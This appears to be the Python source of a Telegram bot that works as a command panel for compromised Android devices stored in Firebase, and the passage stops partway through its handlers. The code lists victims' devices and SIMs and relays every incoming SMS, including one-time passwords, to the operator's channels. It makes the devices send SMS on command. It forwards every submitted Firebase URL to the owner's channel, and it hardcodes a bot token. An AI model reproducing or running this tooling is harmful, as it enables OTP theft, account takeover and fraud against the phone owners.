"""
╔══════════════════════════════════════════════╗
║       ARYAN AUTOTOKEN BOT  v5.0             ║
║       GOD SPEED · ZERO DELAY · ULTRA FIRE   ║
║       Owner: @Aryan_babu99                  ║
╚══════════════════════════════════════════════╝

pip install aiogram==3.7.0 aiohttp uvloop orjson
python aryan_autotoken_bot.py
"""

import asyncio, json, os, time, logging, ssl, re, io, zipfile, struct
from datetime import datetime, timedelta
from copy import deepcopy

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    BufferedInputFile
)
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

try:
    import orjson as _json
    _USE_ORJSON = True
except ImportError:
    import json as _json
    _USE_ORJSON = False

# ══════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("AryanAutoToken")

# ══════════════════════════════════════════════
#  OWNER ID — XOR obfuscated
# ══════════════════════════════════════════════
_s = [0x37,0x39,0x34,0x39,0x35,0x33,0x39,0x37,0x39,0x34]
_OWNER_ID = int("".join(chr(x) for x in _s))   # 7949539794

# ══════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════
BOT_TOKEN      = "8655983220:AAGMf6DRTyDcWG_EfiC6VowWyg8XO2AlbE0"
OWNER_ID       = _OWNER_ID               # @Aryan_babu99 — 7949539794
ADMIN_ID       = 8897775081              # admin chat id
OWNER_USERNAME = "@Aryan_babu99"

CHANNEL_ID     = -1003223668976          # channel users must join
CHANNEL_LINK   = "https://t.me/CIPHER889988"
FB_LOG_CHANNEL = -1004379319158          # all firebase URLs forwarded here

BOT_VERSION    = "5.0.0"
DATA_FILE      = "aryan_data.json"
_VERSION       = "v5.0"

_POLL_INTERVAL = 4
_MAX_SEEN_IDS  = 500

# ══════════════════════════════════════════════
#  MULTI-FORMAT SMS PARSER
# ══════════════════════════════════════════════
_ONE_TAP_RE = re.compile(
    r'(?i)One-tap copy:\s*([0-9+][0-9+\s-]*)\s*\|\s*(.+?)(?:\n|$)',
    re.IGNORECASE
)
_TO_RE = re.compile(
    r'(?:To|to)\s*(?:\(Tap to copy\))?\s*:\s*([+\d\s\-]{7,})',
    re.IGNORECASE
)
_BODY_RE = re.compile(
    r'(?:Body|Massage|Message|MSG|SMS|Text|Content)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n📋|\n━━|\n╔|$)',
    re.IGNORECASE | re.DOTALL
)

def parse_sms(text: str):
    if not text:
        return None, None

    # Format 1 — One-tap copy
    m = _ONE_TAP_RE.search(text)
    if m:
        return m.group(1).strip(), m.group(2).strip()

    lines = [l.strip() for l in text.split("\n") if l.strip()]

    # Format 4 — RECIPIENT / MESSAGE tags
    ml = next((l for l in lines if "MESSAGE" in l and "🏷" in l), None)
    rl = next((l for l in lines if "RECIPIENT" in l and "🏷" in l), None)
    if ml and rl:
        return rl.split(":", 1)[-1].strip(), ml.split(":", 1)[-1].strip()

    # Format 2 & 3 — To: / Body: regex
    to_m   = _TO_RE.search(text)
    body_m = _BODY_RE.search(text)
    if to_m and body_m:
        to_num = re.sub(r'[\s\-]', '', to_m.group(1))
        if len(to_num) == 10:
            to_num = "+91" + to_num
        elif not to_num.startswith("+"):
            to_num = "+" + to_num
        body = body_m.group(1).strip().split("\n")[0].strip()
        return to_num, body

    # Format 5 — line-by-line fallback
    def _lf(tp, tk, mp, mk, ti, mi):
        t = m_ = None
        for i, line in enumerate(lines):
            if line.startswith(tp) and tk in line:
                v = line.split(tk, 1)[1].strip()
                t = v if (ti and v) else (lines[i+1].strip() if (not ti and i+1 < len(lines)) else None)
            if line.startswith(mp) and mk in line:
                v = line.split(mk, 1)[1].strip()
                m_ = v if (mi and v) else (lines[i+1].strip() if (not mi and i+1 < len(lines)) else None)
        return (t, m_) if t and m_ else (None, None)

    for args in [
        ("📱", "To:", "💬", "Full Message:", True, False),
        ("📍", "To:", "💬", "Message:", False, False),
        ("To:", "To:", "Message:", "Message:", True, True),
        ("📱", "Receiver", "🔑", "Message", False, False),
        ("📞", "To:", "💬", "Message:", True, True),
    ]:
        r = _lf(*args)
        if r[0]:
            return r

    return None, None

# ══════════════════════════════════════════════
#  FSM STATES
# ══════════════════════════════════════════════
class W(StatesGroup):
    fb_url        = State()
    dev_manual    = State()
    ch_input      = State()
    otp_ch_input  = State()
    test_to       = State()
    test_msg      = State()
    fwd_add       = State()
    adm_add       = State()
    usr_add_id    = State()
    usr_add_exp   = State()
    broadcast_msg = State()

# ══════════════════════════════════════════════
#  STORAGE
# ══════════════════════════════════════════════
def _new_user():
    return {
        "firebases":        [],
        "channels":         [],
        "otp_channels":     [],
        "active":           {},
        "monitoring":       False,
        "fwd":              [],
        "stats":            {"sent": 0, "failed": 0, "last": "—"},
        "expires":          None,
        "added_by":         None,
        "notify_on":        True,
        "locked_msgs":      {},
        "connected_device": None,
        "selected_sim":     None,
        "balance":          {},
    }

_DEFAULTS = {
    "admins":      [OWNER_ID, ADMIN_ID],
    "free":        False,
    "bot_mode":    True,
    "users":       {},
    "timed_users": {},
}

def load() -> dict:
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE) as f:
            d = json.load(f)
        for k, v in _DEFAULTS.items():
            if k not in d:
                d[k] = v
        for aid in [OWNER_ID, ADMIN_ID]:
            if aid not in d["admins"]:
                d["admins"].append(aid)
        return d
    return deepcopy(_DEFAULTS)

_save_pending = False
_save_lock = asyncio.Lock()

def save(d: dict):
    global _save_pending
    if not _save_pending:
        _save_pending = True
        asyncio.create_task(_debounced_write(d))

async def _debounced_write(d: dict):
    global _save_pending
    await asyncio.sleep(0.5)
    async with _save_lock:
        with open(DATA_FILE, "w") as f:
            json.dump(d, f, indent=2)
        _save_pending = False

def usr(uid: int, d: dict) -> dict:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = _new_user()
    u = d["users"][k]
    for key, val in _new_user().items():
        if key not in u:
            u[key] = val
    return u

# ══════════════════════════════════════════════
#  PERMISSIONS
# ══════════════════════════════════════════════
def is_owner(uid):       return uid in [OWNER_ID, ADMIN_ID]
def is_admin(uid, d):    return is_owner(uid) or uid in d.get("admins", [])

def can_use(uid: int, d: dict) -> bool:
    if is_admin(uid, d):           return True
    if d.get("free"):              return True
    if not d.get("bot_mode", True): return False
    tu = d.get("timed_users", {}).get(str(uid))
    if tu:
        if tu["expires"] is None:        return True
        if time.time() < tu["expires"]:  return True
    return False

def access_label(uid: int, d: dict) -> str:
    if uid == OWNER_ID:   return "👑 Owner"
    if is_admin(uid, d):  return "🛡 Admin"
    tu = d.get("timed_users", {}).get(str(uid))
    if tu:
        if tu["expires"] is None: return "🔓 User"
        rem = tu["expires"] - time.time()
        if rem > 0:
            h = int(rem // 3600); m = int((rem % 3600) // 60)
            return f"⏱ {h}h {m}m left"
        return "🚫 Expired"
    return "🚫 No Access"

# ══════════════════════════════════════════════
#  UI CARDS
# ══════════════════════════════════════════════
_BARS = {
    "block":  ("█", "░"),
    "round":  ("●", "○"),
    "square": ("■", "□"),
}

def pbar(done: int, total: int, style="block", width=10) -> str:
    if total == 0: return _BARS[style][1] * width
    filled = round(done / total * width)
    f, e = _BARS[style]
    return f * filled + e * (width - filled)

def pct(done: int, total: int) -> str:
    return f"{round(done/total*100)}%" if total else "0%"

def setup_progress_card(u: dict) -> str:
    steps = [
        ("Firebase",  bool(u.get("firebases"))),
        ("Device",    bool(u.get("connected_device"))),
        ("Token CN",  bool(u.get("channels"))),
        ("OTP CN",    bool(u.get("otp_channels"))),
    ]
    done = sum(1 for _, v in steps if v)
    bar  = pbar(done, 4, "square", 8)
    lines = [f"  {'✅' if ok else '🔲'}  {name}" for name, ok in steps]
    return (
        f"┌─────────────────────────┐\n"
        f"│  🔧 Setup   {bar}  {done}/4 │\n"
        f"├─────────────────────────┤\n"
        + "\n".join(f"│  {l:<23}│" for l in lines) +
        f"\n└─────────────────────────┘"
    )

def stats_card(u: dict) -> str:
    s     = u.get("stats", {})
    sent  = s.get("sent", 0)
    fail  = s.get("failed", 0)
    total = sent + fail
    bar   = pbar(sent, total, "round", 8)
    rate  = pct(sent, total)
    return (
        f"┌─────────────────────────┐\n"
        f"│  📊 Stats   {bar}        │\n"
        f"├─────────────────────────┤\n"
        f"│  ✅  Sent   : {str(sent):<10}│\n"
        f"│  ❌  Failed : {str(fail):<10}│\n"
        f"│  📈  Rate   : {rate:<10}│\n"
        f"│  🕐  Last   : {str(s.get('last','—')):<10}│\n"
        f"└─────────────────────────┘"
    )

def active_combo_card(u: dict) -> str:
    dev  = u.get("connected_device") or {}
    sim  = u.get("selected_sim") or {}
    mon  = "🟢 Running" if u.get("monitoring") else "🔴 Stopped"
    fb   = str(u.get("active", {}).get("fb_url", "—"))
    fb_s = fb[:30] + "…" if len(fb) > 30 else fb
    model  = dev.get("modelName", "—") if isinstance(dev, dict) else "—"
    phone  = sim.get("phoneNumber", "—") if isinstance(sim, dict) else "—"
    batt   = dev.get("battery", "—") if isinstance(dev, dict) else "—"
    tkcn   = "✅" if u.get("channels") else "❌"
    otpcn  = "✅" if u.get("otp_channels") else "❌"
    return (
        f"╔═══════════════════════════╗\n"
        f"║   💞 CONNECTED DEVICE 💞   ║\n"
        f"╠═══════════════════════════╣\n"
        f"║  🔥 {fb_s:<26}║\n"
        f"║  🪩 {model:<26}║\n"
        f"║  📞 {phone:<26}║\n"
        f"║  🔋 Battery : {str(batt):<15}║\n"
        f"║  🔑 Token CN: {tkcn:<15}║\n"
        f"║  📨 OTP CN  : {otpcn:<15}║\n"
        f"║  🔄 Monitor : {mon:<15}║\n"
        f"╚═══════════════════════════╝"
    )

def home_card(uid: int, d: dict) -> str:
    u    = usr(uid, d)
    role = access_label(uid, d)
    tu   = d.get("timed_users", {}).get(str(uid))
    exp_line = ""
    if tu and tu.get("expires"):
        rem = tu["expires"] - time.time()
        if rem > 0:
            h = int(rem // 3600); m = int((rem % 3600) // 60)
            bar_r = pbar(int(rem), 604800, "block", 6)
            exp_line = f"\n  ⏱  {bar_r}  {h}h {m}m remaining"
    mon = "🟢 ON" if u.get("monitoring") else "🔴 OFF"
    bm  = "🟢 ON" if d.get("bot_mode", True) else "🔴 OFF"
    last_up = datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')
    return (
        f"╔══════════════════════════╗\n"
        f"║   📱  ARYAN AUTOTOKEN    ║\n"
        f"║        {_VERSION}              ║\n"
        f"╚══════════════════════════╝\n\n"
        f"  🏷  Role    :  {role}{exp_line}\n"
        f"  🔄  Monitor :  {mon}\n"
        f"  🤖  Bot     :  {bm}\n"
        f"  🕐  Updated :  {last_up}\n\n"
        f"{setup_progress_card(u)}\n\n"
        f"{stats_card(u)}"
    )

# ══════════════════════════════════════════════
#  KEYBOARD HELPERS
# ══════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def main_menu(uid: int, d: dict) -> InlineKeyboardMarkup:
    rows = [
        [("🔥 FIREBASE",    "menu:firebase"),  ("📱 ONLINE",     "menu:online")],
        [("💔 DISCONNECT",  "menu:disconnect"),("📨 OTP CHANNEL","menu:otp_cn")],
        [("🔑 TOKEN CN",    "menu:token_cn"),  ("🔍 SEARCH",     "menu:search")],
        [("📊 STATUS",      "menu:status"),    ("🚪 LOGOUT",     "menu:logout")],
        [("🧪 TEST SMS",    "menu:test"),      ("🔕 NOTIF",      "toggle:notify")],
    ]
    if is_admin(uid, d):
        rows.append([("⚙️ BOT MODE", "menu:bot_mode"), ("📢 BROADCAST", "menu:broadcast")])
        rows.append([("👥 USERS",    "menu:users"),     ("📋 BACKUP",   "menu:backup")])
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def sim_kb(sims: list, dev_id: str) -> InlineKeyboardMarkup:
    rows = []
    for i, sim in enumerate(sims):
        phone   = sim.get("phoneNumber", "N/A")
        carrier = sim.get("carrierName", "")
        slot    = sim.get("simSlotIndex", i)
        label   = f"📶 SIM {i+1} | 📞 {phone}"
        if carrier:
            label += f" ({carrier})"
        rows.append([InlineKeyboardButton(
            text=label[:55],
            callback_data=f"sim:{dev_id}:{i}"
        )])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def devices_kb(devices: dict, page: int = 0) -> InlineKeyboardMarkup:
    items    = list(devices.items())
    per_page = 5
    total_pg = (len(items) + per_page - 1) // per_page
    chunk    = items[page * per_page:(page + 1) * per_page]
    rows = []
    for did, dd in chunk:
        name   = dd.get("modelName") or dd.get("deviceName") or did
        sims   = dd.get("sims", [])
        phone  = sims[0].get("phoneNumber", "") if sims else ""
        batt   = dd.get("battery", "?")
        online = "🟢" if dd.get("status") is True else "🔴"
        label  = f"{online} {name}"
        if phone: label += f" | {phone}"
        rows.append([InlineKeyboardButton(text=label[:52], callback_data=f"dev:pick:{did}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="◀️ Prev", callback_data=f"dev:pg:{page-1}"))
    if page < total_pg - 1:
        nav.append(InlineKeyboardButton(text="Next ▶️", callback_data=f"dev:pg:{page+1}"))
    if nav: rows.append(nav)
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ══════════════════════════════════════════════
#  FIREBASE — GOD SPEED 30 TCP + 15 PARALLEL
# ══════════════════════════════════════════════
_conn_pool: list = []
_pool_lock        = asyncio.Lock()
_pool_host        = None
_http_session     = None

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        _http_session = aiohttp.ClientSession(connector=conn)
    return _http_session

async def warmup_pool(fb_url: str):
    global _conn_pool, _pool_host
    if not fb_url: return
    host = fb_url.replace("https://", "").replace("http://", "").rstrip("/")
    if host == _pool_host and len(_conn_pool) > 10:
        return   # already warm
    _pool_host = host
    for _, writer in _conn_pool:
        try: writer.close()
        except: pass
    _conn_pool.clear()
    ssl_ctx = ssl.create_default_context()
    tasks   = [asyncio.open_connection(host, 443, ssl=ssl_ctx) for _ in range(30)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception) and res is not None:
            _conn_pool.append(res)
    log.info(f"🔥 {len(_conn_pool)} connections pre-warmed")

async def _get_conn():
    global _conn_pool, _pool_host
    async with _pool_lock:
        while _conn_pool:
            reader, writer = _conn_pool.pop()
            if not writer.is_closing():
                return reader, writer
    ssl_ctx = ssl.create_default_context()
    return await asyncio.open_connection(_pool_host, 443, ssl=ssl_ctx)

async def _return_conn(reader, writer):
    if writer.is_closing():
        try: writer.close()
        except: pass
        return
    async with _pool_lock:
        _conn_pool.append((reader, writer))

async def _fire_one(fb_url: str, dev: str, sim_slot: int, to: str, msg: str):
    host     = fb_url.replace("https://", "").replace("http://", "").rstrip("/")
    url_path = f"/clients/{dev}/webhookEvent/sendSms.json?print=silent"
    data_dict = {
        "from":      sim_slot,
        "to":        to,
        "message":   msg,
        "isSended":  False,
        "timestamp": int(time.time())
    }
    payload = (_json.dumps(data_dict) if _USE_ORJSON
               else _json.dumps(data_dict).encode("utf-8"))
    http_req = (
        f"PUT {url_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + payload
    try:
        reader, writer = await _get_conn()
        writer.write(http_req)
        await asyncio.wait_for(writer.drain(), timeout=0.1)
        await _return_conn(reader, writer)
        return True
    except:
        return False

async def fire_parallel(fb_url: str, dev: str, sim_slot: int, to: str, msg: str) -> bool:
    tasks   = [_fire_one(fb_url, dev, sim_slot, to, msg) for _ in range(15)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return any(r is True for r in results)

async def fb_get(base: str, path: str) -> dict:
    try:
        sess = await get_http_session()
        url  = f"{base.rstrip('/')}{path}"
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status != 200: return {}
            data = await r.json()
            return data if isinstance(data, dict) else {}
    except Exception as e:
        log.error(f"fb_get error: {e}")
        return {}

def dev_online(dd: dict) -> bool:
    if not isinstance(dd, dict): return False
    if dd.get("status") is True:  return True
    if dd.get("isOnline") or dd.get("online"): return True
    if dd.get("status") in ("online", "active"): return True
    return False

# ══════════════════════════════════════════════
#  RECHARGE CHECK — Hindi + English keywords
# ══════════════════════════════════════════════
_EXP_KW = [
    "recharge expired","validity expired","plan expired","no outgoing",
    "outgoing barred","incoming barred","service suspended","validity over",
    "recharge due","insufficient balance","zero balance",
    "रिचार्ज समाप्त","रिचार्ज खत्म","वैधता समाप्त","आउटगोइंग बंद",
    "इनकमिंग बंद","सेवा निलंबित","आपका प्लान समाप्त","बैलेंस कम","शून्य बैलेंस",
]
_SUC_KW = [
    "recharge successful","recharge done","plan activated","recharge completed",
    "successfully recharged","plan renewed","validity extended",
    "रिचार्ज सफल","रिचार्ज पूर्ण","आपका रिचार्ज सफल","प्लान एक्टिवेट","रिचार्ज हो गया",
]

async def check_recharge(fb_url: str, dev_id: str, sim_number: str) -> str:
    paths   = [f"/messages/{dev_id}", f"/clients/{dev_id}/messages"]
    cutoff  = datetime.now() - timedelta(days=10)
    all_msgs = []
    for path in paths:
        try:
            data = await fb_get(fb_url, f"{path}.json")
            for mid, mdata in data.items():
                if not isinstance(mdata, dict): continue
                body   = (mdata.get("body") or mdata.get("message") or "").lower()
                from_  = str(mdata.get("from") or mdata.get("sender") or "")
                ts     = mdata.get("timestamp") or mdata.get("time")
                mtime  = datetime.now()
                if ts:
                    try: mtime = datetime.fromtimestamp(int(ts)/1000 if int(ts)>1e10 else int(ts))
                    except: pass
                if mtime < cutoff: continue
                sim_c  = re.sub(r'\D', '', sim_number)[-10:]
                from_c = re.sub(r'\D', '', from_)[-10:]
                if sim_c in from_c or sim_c in body.replace(" ", ""):
                    all_msgs.append({"time": mtime, "body": body})
        except: pass
    if not all_msgs: return "✅ AVAILABLE"
    all_msgs.sort(key=lambda x: x["time"], reverse=True)
    last_exp = None
    for m in all_msgs:
        if any(k in m["body"] for k in _EXP_KW):
            last_exp = m["time"]; break
    if not last_exp: return "✅ AVAILABLE"
    for m in all_msgs:
        if m["time"] > last_exp and any(k in m["body"] for k in _SUC_KW):
            return "✅ RECHARGED"
    return "⚠️ EXPIRED"

# ══════════════════════════════════════════════
#  OTP MONITOR — message lock (no duplicates)
# ══════════════════════════════════════════════
_otp_tasks: dict[int, asyncio.Task] = {}

async def otp_monitor_worker(bot: Bot, uid: int):
    d      = load(); u = usr(uid, d)
    ac     = u.get("active", {})
    fb_url = ac.get("fb_url")
    dev    = u.get("connected_device", {})
    dev_id = dev.get("id") if isinstance(dev, dict) else None
    otp_chs= u.get("otp_channels", [])
    if not fb_url or not dev_id or not otp_chs: return

    locked = set(u.get("locked_msgs", {}).get("otp", []))
    paths  = [f"/messages/{dev_id}", f"/clients/{dev_id}/messages"]
    for path in paths:
        try:
            data = await fb_get(fb_url, f"{path}.json")
            for k in data.keys(): locked.add(k)
        except: pass

    log.info(f"OTP monitor START uid={uid}")
    while True:
        try:
            await asyncio.sleep(0.5)
            for path in paths:
                try:
                    data = await fb_get(fb_url, f"{path}.json")
                    for mid, mdata in data.items():
                        if mid in locked: continue
                        locked.add(mid)
                        if not isinstance(mdata, dict): continue
                        from_ = mdata.get("from") or mdata.get("sender") or "Unknown"
                        body  = mdata.get("body") or mdata.get("message") or ""
                        t     = mdata.get("timestamp") or datetime.now().strftime("%H:%M:%S")
                        if not body: continue
                        otp_msg = (
                            f"╔════════════════════════╗\n"
                            f"      📱 𝗡𝗘𝗪 𝗦𝗠𝗦 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗        \n"
                            f"╚════════════════════════╝\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"📞 𝗙𝗿𝗼𝗺: {from_}\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📝 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:\n{body}\n\n"
                            f"🕐 𝗧𝗶𝗺𝗲: {t}\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"📋 Tap on the code to copy it"
                        )
                        for ch in otp_chs:
                            try: await bot.send_message(ch, otp_msg)
                            except: pass
                        d2 = load(); u2 = usr(uid, d2)
                        u2.setdefault("locked_msgs", {}).setdefault("otp", [])
                        u2["locked_msgs"]["otp"] = list(locked)[-500:]
                        save(d2)
                except: pass
        except asyncio.CancelledError:
            log.info(f"OTP monitor STOP uid={uid}"); break
        except Exception as e:
            log.error(f"OTP monitor uid={uid}: {e}")
            await asyncio.sleep(5)

# ══════════════════════════════════════════════
#  TOKEN PUSH — exact screenshot UI
# ══════════════════════════════════════════════
async def _do_token_push(bot: Bot, uid: int, to: str, msg_text: str, source_name: str):
    d        = load(); u = usr(uid, d)
    ac       = u.get("active", {})
    fb       = ac.get("fb_url")
    dev_info = u.get("connected_device") or {}
    dev_id   = dev_info.get("id") if isinstance(dev_info, dict) else None
    sim_info = u.get("selected_sim") or {}
    sim_slot = sim_info.get("simSlotIndex", 0) if isinstance(sim_info, dict) else 0
    sim_phone= sim_info.get("phoneNumber", "—") if isinstance(sim_info, dict) else "—"
    rpt      = int(ac.get("repeat", 1))

    if not fb or not dev_id:
        try: await bot.send_message(uid, "❌ 𝗗𝗲𝘃𝗶𝗰𝗲 𝗻𝗼𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱!")
        except: pass
        return

    # — Sending notification (screenshot style)
    if u.get("notify_on", True):
        try:
            await bot.send_message(uid,
                f"⏳ Sending SMS to {to[:20]}...\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"📡 Source: {source_name}\n"
                f"📶 SIM: {sim_phone}"
            )
        except: pass

    await warmup_pool(fb)
    ok = 0; fail = 0
    for _ in range(rpt):
        result = await fire_parallel(fb, dev_id, sim_slot, to, msg_text)
        if result: ok += 1
        else: fail += 1

    icon   = "✅" if fail == 0 else ("⚠️" if ok > 0 else "❌")
    status = "SENT" if fail == 0 else ("PARTIAL" if ok > 0 else "FAILED")

    # — Delivery report (Dynamo AutoToken screenshot exact style)
    report = (
        f"📱 SMS Delivery Report\n\n"
        f"{icon} STATUS: {status}\n"
        f"📱 To: {to}\n"
        f"💬 Message: {msg_text[:80]}{'…' if len(msg_text)>80 else ''}\n"
        f"👥 From: {source_name}\n"
        f"📶 SIM: {sim_phone}\n"
        f"🔁 Repeat: {rpt}x"
    )
    if u.get("notify_on", True):
        try: await bot.send_message(uid, report)
        except: pass

    for tgt in u.get("fwd", []):
        try:
            c = int(tgt) if str(tgt).lstrip("-").isdigit() else tgt
            await bot.send_message(c, report)
        except: pass

    d2 = load(); u2 = usr(uid, d2)
    u2["stats"]["sent"]   = u2["stats"].get("sent", 0) + ok
    u2["stats"]["failed"] = u2["stats"].get("failed", 0) + fail
    u2["stats"]["last"]   = datetime.now().strftime("%H:%M:%S")
    save(d2)
    log.info(f"uid={uid} push to={to} status={status}")

# ══════════════════════════════════════════════
#  CHANNEL POST HANDLER
# ══════════════════════════════════════════════
R = Router()

@R.channel_post()
@R.message(F.chat.type.in_({"group", "supergroup"}))
async def channel_handler(msg: Message, bot: Bot):
    d = load()
    if not d.get("bot_mode", True): return
    cid  = msg.chat.id
    text = msg.text or msg.caption or ""
    to, sms = parse_sms(text)
    if not to or not sms: return
    source_name = msg.chat.title or str(cid)
    for uid_str, u in d["users"].items():
        uid = int(uid_str)
        if not can_use(uid, d): continue
        for ch in u.get("channels", []):
            ch_id = ch if isinstance(ch, int) else ch.get("id")
            if ch_id == cid:
                asyncio.create_task(_do_token_push(bot, uid, to, sms, source_name))
                break

# ══════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════
async def sedit(cq: CallbackQuery, text: str, markup=None):
    try:
        await cq.message.edit_text(text, reply_markup=markup, parse_mode="Markdown")
    except TelegramBadRequest:
        pass

async def notify_admins(bot: Bot, d: dict, text: str, exclude: int = None):
    for tid in set([OWNER_ID, ADMIN_ID] + d.get("admins", [])):
        if tid == exclude: continue
        try: await bot.send_message(tid, text, parse_mode="Markdown")
        except: pass

def make_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        if os.path.exists(DATA_FILE): z.write(DATA_FILE)
        z.write(__file__, "aryan_autotoken_bot.py")
    buf.seek(0); return buf.read()

def _add_timed_user(uid2: int, expires, added_by: int, d: dict):
    d.setdefault("timed_users", {})[str(uid2)] = {
        "expires": expires, "added_by": added_by, "added_at": int(time.time())
    }

async def fetch_online_devices(fb_url: str) -> dict:
    all_devs = await fb_get(fb_url, "/clients.json")
    return {k: v for k, v in all_devs.items() if dev_online(v)}

# ══════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════
@R.message(Command("start"))
async def c_start(msg: Message, state: FSMContext):
    await state.clear()
    d = load(); uid = msg.from_user.id
    if not can_use(uid, d):
        await msg.answer(
            f"╔═══════════════════════╗\n"
            f"║  🚫 ACCESS DENIED     ║\n"
            f"╚═══════════════════════╝\n\n"
            f"Contact: {OWNER_USERNAME}"
        ); return
    usr(uid, d); save(d)
    await msg.answer(home_card(uid, d), reply_markup=main_menu(uid, d), parse_mode="Markdown")

@R.message(Command("menu"))
async def c_menu(msg: Message, state: FSMContext):
    await state.clear()
    d = load(); uid = msg.from_user.id
    if not can_use(uid, d): return
    await msg.answer(home_card(uid, d), reply_markup=main_menu(uid, d), parse_mode="Markdown")

# ══════════════════════════════════════════════
#  FSM HANDLERS
# ══════════════════════════════════════════════
@R.message(W.fb_url)
async def f_fb_url(msg: Message, state: FSMContext, bot: Bot):
    url = msg.text.strip()
    try: await bot.delete_message(msg.chat.id, msg.message_id)
    except: pass
    if not url.startswith("http"):
        await msg.answer("❌ URL must start with https://"); return
    d = load(); uid = msg.from_user.id; u = usr(uid, d)
    wait = await msg.answer("🔄 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲...")
    all_devs = await fb_get(url, "/clients.json")
    try: await wait.delete()
    except: pass
    if not all_devs:
        await msg.answer("❌ 𝗘𝗺𝗽𝘁𝘆 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲! No clients found.")
        await state.clear(); return
    u.setdefault("firebases", []).append({"url": url, "count": len(all_devs)})
    u["active"]["fb_url"] = url
    save(d)
    # log to firebase channel
    uname = msg.from_user.username or str(uid)
    try: await bot.send_message(FB_LOG_CHANNEL,
        f"📡 𝗡𝗘𝗪 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 𝗙𝗢𝗨𝗡𝗗 𝗜𝗡 𝗕𝗢𝗧\n\n"
        f"𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗟𝗶𝗻𝗸 - {url}\n\n"
        f"𝗧𝗼𝘁𝗮𝗹 𝗰𝗹𝗶𝗲𝗻𝘁𝘀 𝗶𝗻 𝗱𝗯 - {len(all_devs)}\n\n"
        f"𝗙𝗿𝗼𝗺 - @{uname}\n\n"
        f"𝗗𝗮𝘁𝗲 - {datetime.now().strftime('%d/%m/%Y')}"
    )
    except: pass
    await state.clear()
    online = {k: v for k, v in all_devs.items() if dev_online(v)}
    await msg.answer(
        f"🩵 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 🩵\n\n"
        f"📊 Total Clients: {len(all_devs)}\n"
        f"🟢 Online: {len(online)}\n\n"
        "Select a device:",
        reply_markup=devices_kb(online if online else all_devs)
    )

@R.message(W.ch_input)
async def f_ch_input(msg: Message, state: FSMContext, bot: Bot):
    ch_input = msg.text.strip()
    try: await bot.delete_message(msg.chat.id, msg.message_id)
    except: pass
    wait = await msg.answer("🔄 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗪𝗜𝗧𝗛 𝗖𝗛𝗔𝗡𝗡𝗘𝗟...")
    try:
        q    = ch_input if ch_input.startswith("-") or ch_input.startswith("@") else f"@{ch_input}"
        chat = await bot.get_chat(q)
        ch_id  = chat.id; ch_ttl = chat.title or str(ch_id)
        try: await wait.delete()
        except: pass
        d = load(); uid = msg.from_user.id; u = usr(uid, d)
        u.setdefault("channels", []).append({"id": ch_id, "title": ch_ttl})
        save(d)
        await state.clear()
        await msg.answer(
            f"☢️ 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 𝗪𝗜𝗧𝗛 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n\n"
            f"📢 {ch_ttl}\n"
            f"𝗪𝗔𝗜𝗧𝗜𝗡𝗚 𝗙𝗢𝗥 𝗡𝗘𝗪 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 📢",
            reply_markup=main_menu(uid, d)
        )
    except Exception as e:
        try: await wait.delete()
        except: pass
        await msg.answer(f"❌ Failed: {e}\n\nMake sure bot is admin in channel.")
        await state.clear()

